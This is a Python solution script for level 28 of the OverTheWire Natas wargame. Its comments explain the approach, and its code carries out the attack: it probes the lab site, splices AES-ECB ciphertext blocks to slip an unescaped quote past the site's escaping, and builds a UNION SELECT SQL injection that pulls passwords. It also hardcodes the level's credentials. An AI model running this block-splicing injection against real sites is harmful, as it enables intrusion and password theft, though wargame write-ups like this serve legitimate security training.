import base64
import binascii
from tools import cryptotools
import requests
from requests.auth import HTTPBasicAuth
import urllib.parse


def main():
    level = 28
    level_about = 'In this level, sadly,  you cannot see a sourcecode of vulnerable website. After submitting a form\n'\
                  'with input "A" we get the some jokes. We can see that our request is encoded in url parameter \n' \
                  'search.php/?query= ... . Our request is encrypted somehow. After few more tries we can see that \n' \
                  'if we set input as some "B", "C" or "AAAAAAAAAAAAAAAAA" or even more of "A"s the beggining of \n' \
                  'encrypted query remains the same and moreover we have some repeating data in our parameter.\n' \
                  'This gives us a clue that we area dealing with some multibyte XOR or sth like AES in ECB MODE. \n' \
                  'Furthermore we notice that the size of the query (which is base64 encoded) seems to be a fixed \n' \
                  'block size with size of 16 bytes. After trying to do some SQL injections nothing happens \n'\
                  'posting chars like apostrophe or question marks doesn\'t work. Moreover these chars seems to be \n' \
                  'properly escaped, as submitting each of this chars gives us valid output with jokes including \n' \
                  'this chars. No we test if the query contains already escaped form of our string by comparing \n' \
                  'length of output with submited 32*"A" and 32*"\'" and.... \n' \
                  'Voila! The output length differs. That means if we find a way to modify the encrypted query in \n' \
                  'the way that it no more contains escaping chars we can execute what we want. We assume the query \n'\
                  'looks like this: SELECT column_name FROM table_with_jokes WHERE column_name LIKE \'%QUERY%\' \n' \
                  'We have full control over QUERY parameter (we have in mind that some chars will be escaped). \n' \
                  'Here is what we\'re going to do: \n' \
                  '1. We will detect all chars that are gonna be escaped based on varying query length. \n' \
                  '2. Then we will make sure of a length of a block size (which seems to be 16 bytes long) \n' \
                  '3. Then we detect the position of out QUERY in a block \n' \
                  '4. Now generate some good blocks which we will be needed later \n' \
                  '5. We generate magick block by posting a QUERY where escaping char remains in preceding block\n' \
                  '6. Now after we have our block with unescaped apostrophe we glue the well formated blocks to it \n'\
                  '7. Voila! We should be able to run our SQL Injection!'

    print("Hi there!\nyou've just run natas level " + str(level) +
          " (http://overthewire.org/wargames/natas/). Credentials are available in the secrets/credentials.py")

    print("\n" + level_about + "\n\n")

    # Real solution starts here :-)

    # TODO - this code needs serious cleanup!
    # If you are bored of computing everything every time sy AIE!
    bored = False
    crypt = cryptotools.CryptoTools(encrypted=base64.b64decode('G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJfIqcn9iVBmk'
                                                               'ZvmvU4kfmy9jPmsF+GYia4Y4FxErHJK/Yz5rBfhmImuGOBcRKxySvj'
                                                               '3zYcY5Nhmsez6dCXsRGup36O0aq+C10FxP/mrBQjq0eOsaH+JhosbB'
                                                               'UGEQmz/to='))
    i = 8
    while i in range(8, 257):
        if cryptotools.aes.detect_aes_128_ecb(crypt.get_encrypted(), i):
            print("Block size : " + str(i))
            print([binascii.hexlify(crypt.get_encrypted()[j * i:j * i + i]) for j in
                   range(0, int(len(crypt.get_encrypted()) / i))])
        i *= 2

    key_for_xor = cryptotools.bytes_xor(bytearray.fromhex('f633e6b05f866226b863817112b1c92b'), b'\x41')
    print("The key is: " + str(key_for_xor))

    for i in range(0, len(crypt.get_encrypted()), 16):
        print(cryptotools.bytes_xor(crypt.get_encrypted()[i: i + 16], key_for_xor))
    # This is not just a multibyte xor encryption time for some serious play

    # detect placement of our data inside a ciphertext
    credentials = HTTPBasicAuth('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')
    previous_array = b''
    bytes_to_pad = -1
    for i in range(0, 48):
        if bored:
            break
        parameters = {"query": 'A' * i}
        r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
        location = r.history[0].headers['Location']
        if location[:18] == 'search.php/?query=':
            encrypted = binascii.hexlify(base64.b64decode(urllib.parse.unquote(location[18:])))
            if cryptotools.compare_bytearrays(previous_array,
                                              bytearray(encrypted[2 * 32:3 * 32])) and bytes_to_pad == -1:
                bytes_to_pad = i - 1
            print(
                'par_size: ' + str(len(parameters['query'])) + '  encrypted blocks: ' + str(len(encrypted) / (16 * 2)) +
                '   Par_content: ' + str(binascii.hexlify(bytearray(parameters['query'].encode('ascii')))))
            print([encrypted[i:i + (16 * 2)] for i in range(0, len(encrypted), (16 * 2))])
            previous_array = bytearray(encrypted[2 * 32:3 * 32])
        else:
            print("Wrong response - cannot parse location header.")
    # detect which characters are escaped
    escaped_chars = ''
    for i in range(32, 127):
        if bored:
            break
        parameters = {"query": chr(i) * 12}
        r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
        location = r.history[0].headers['Location']
        if location[:18] == 'search.php/?query=':
            encrypted = binascii.hexlify(base64.b64decode(urllib.parse.unquote(location[18:])))
            print(
                'par_size: ' + str(len(parameters['query'])) + '  encrypted blocks: ' + str(len(encrypted) / (16 * 2)) +
                '   Par_content: ' + str(binascii.hexlify(bytearray(parameters['query'].encode('ascii')))))
            print([encrypted[i:i + (16 * 2)] for i in range(0, len(encrypted), (16 * 2))])
            if len(encrypted) / (16 * 2) > 5:
                escaped_chars += chr(i)
        else:
            print("Wrong response - cannot parse location header.")
    if bored:
        bytes_to_pad = 10

    print("Bytes to pad before text: " + str(bytes_to_pad))
    print('Chars that are escaped: ' + escaped_chars)

    # Get 3 first block containing 1* A in query
    parameters = {"query": 'A' * 10}
    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
    location = r.history[0].headers['Location']
    nice_begin_blocks = b''
    if location[:18] == 'search.php/?query=':
        encrypted = base64.b64decode(urllib.parse.unquote(location[18:]))
        nice_begin_blocks = encrypted[:16 * 3]

    # Now generate block with unescaped ' and union statement
    statement = (' ' * (bytes_to_pad - 1)) + "' UNION SELECT password FROM users #"
    parameters = {"query": statement}
    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', data=parameters, auth=credentials)
    location = r.history[0].headers['Location']
    nice_blocks = b''
    if location[:18] == 'search.php/?query=':
        encrypted = base64.b64decode(urllib.parse.unquote(location[18:]))
        nice_blocks = encrypted[16 * 3:]
    else:
        print("Wrong response - cannot parse location header.")

    payload = base64.b64encode(nice_begin_blocks + nice_blocks)
    payload = str(payload)[2:-1]
    # consider URL encoding here (most browsers don't rly need it anyway - and it's not a bug it's a feature)
    print("Heavy payload here: " + payload)

    return True


if __name__ == '__main__':
    main()
